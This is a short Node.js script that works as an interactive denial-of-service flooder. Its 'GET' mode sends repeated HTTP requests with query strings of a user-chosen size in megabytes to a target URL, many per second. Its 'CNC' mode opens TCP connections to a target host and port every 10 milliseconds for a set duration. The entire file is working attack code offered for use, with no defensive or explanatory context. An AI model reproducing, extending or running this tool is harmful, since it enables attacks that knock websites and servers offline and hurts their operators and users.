const request = require('request');
const net = require('net');
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

readline.question('Layer7: GET \nLayer4: CNC \nEnter method: ', (method_input) => {
    if (method_input == 'GET') {
        readline.question('URL: ', (url) => {
            readline.question('Packet Size (MB): ', (size) => {
                readline.question('Time (seconds): ', (time) => {
                    readline.question('Multi requests: ', (requests) => {
                        const send_packets = setInterval(() => {
                            for (let i = 0; i < requests; i++) {
                                request({ uri: url, qs: { data: '0'.repeat(size * 1024 * 1024) }, json: true });
                            }
                        }, 1000)
                        setTimeout(() => {
                            clearInterval(send_packets)
                        }, time * 1000)
                    });
                });
            });
        });
    } else if (method_input == 'CNC') {
        readline.question('Host: ', (host) => {
            readline.question('Port: ', (port) => {
                readline.question('Time to build (seconds): ', (build_time) => {
                    const connector = setInterval(() => {
                        net.createConnection({ host, port });
                    }, 10);
                    setTimeout(() => {
                        clearInterval(connector)
                    }, build_time * 1000)
                });
            });
        });
    } else {
        console.log('Invalid method!')
    }
});